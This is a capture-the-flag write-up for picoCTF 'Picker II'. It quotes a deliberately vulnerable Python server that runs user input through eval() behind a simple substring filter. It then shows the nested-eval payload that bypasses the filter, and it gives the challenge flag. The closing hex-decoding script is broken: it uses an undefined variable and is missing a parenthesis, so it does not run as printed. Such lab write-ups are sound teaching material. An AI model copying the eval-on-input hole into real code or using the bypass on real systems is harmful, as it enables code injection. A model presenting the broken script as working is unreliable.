---
title: "PicoCTF: Picker II"
summary: "Navigating around a simple substring check."
date: 2024-09-04
tags: ["picoctf"]
categories: ["write-up", "reverse_engineering"]
draft: false
---
# Investigating the Source Code
In this challenge, we are provided with the source code of the script directly.

Here are the interesting snippets of the source code:

```python3
def filter(user_input):
  if 'win' in user_input:
    return False
  return True


while(True):
  try:
    user_input = input('==> ')
    if( filter(user_input) ):
      eval(user_input + '()')
    else:
      print('Illegal input')
  except Exception as e:
    print(e)
    break

```

It looks like the entrypoint for the server uses a helper function, `filter()`, to determine if the user is trying to call the `win()` function.

The important thing to note is that the code assumes any input past the `filter()` function is valid, so it does not perform any additional checks.

So, we just need to get the `user_input` variable to evaluate to the string "win" when the server executes our Python code.

# The Nested Eval Approach
## Intuition
We know that we need the `user_input` variable to evaluate to "win" after the server executes our code. So, we can provide as input an `eval()` function that evaluates to "win".

## Implementation
In this case, I just had a short line of code that converted the ASCII values of "w", "i", "n" to their respective characters, and added them into the single word "win".

```python3
eval(chr(119) + chr(105) + chr(110)) # win
```


On the server, this essentially gets represented like below:
```python3
eval(eval(chr(119) + chr(105) + chr(110)) + '()')
```

After the nested `eval()` call, the server essentially executes the below code, which outputs the flag:
```python3
eval("win" + '()') # -> eval("win()")

```

## Cleaning Up the Flag
Similar to Picker I, the output of the flag is a space separated string of hex codes:

```
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x66 0x31 0x6c 0x37 0x33 0x72 0x35 0x5f 0x66 0x34 0x31 0x6c 0x5f 0x63 0x30 0x64 0x33 0x5f 0x72 0x33 0x66 0x34 0x63 0x37 0x30 0x72 0x5f 0x6d 0x31 0x67 0x68 0x37 0x5f 0x35 0x75 0x63 0x63 0x33 0x33 0x64 0x5f 0x39 0x35 0x64 0x34 0x34 0x35 0x39 0x30 0x7d
```

So, we can write a tiny Python script to clean up this text and output the flag:

```python3

flag = "0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x66 0x31 0x6c 0x37 0x33 0x72 0x35 0x5f 0x66 0x34 0x31 0x6c 0x5f 0x63 0x30 0x64 0x33 0x5f 0x72 0x33 0x66 0x34 0x63 0x37 0x30 0x72 0x5f 0x6d 0x31 0x67 0x68 0x37 0x5f 0x35 0x75 0x63 0x63 0x33 0x33 0x64 0x5f 0x39 0x35 0x64 0x34 0x34 0x35 0x39 0x30 0x7d"

flag = flag.split(" ")

print("".join(chr(int(word, 16)) for char in flag if char != "")
# picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}
```
